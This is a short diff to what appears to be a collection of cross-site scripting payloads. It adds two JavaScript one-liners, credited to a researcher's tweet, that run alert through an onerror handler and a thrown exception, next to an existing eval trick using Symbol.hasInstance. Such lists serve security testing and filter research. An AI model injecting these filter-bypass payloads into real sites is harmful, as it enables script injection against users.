@@ -44,6 +44,13 @@ xss.html
 
 ---
 
+[Garethheyes](https://twitter.com/garethheyes/status/1408510651321012227?)
+
+    var{haha:onerror=alert}=0;throw 1
+    var{a:onerror}={a:alert};throw 1
+
+---
+
 [Garethheyes](https://twitter.com/garethheyes/status/1128974215682637825)
 
     'alert\x2823\x29'instanceof{[Symbol.hasInstance]:eval}
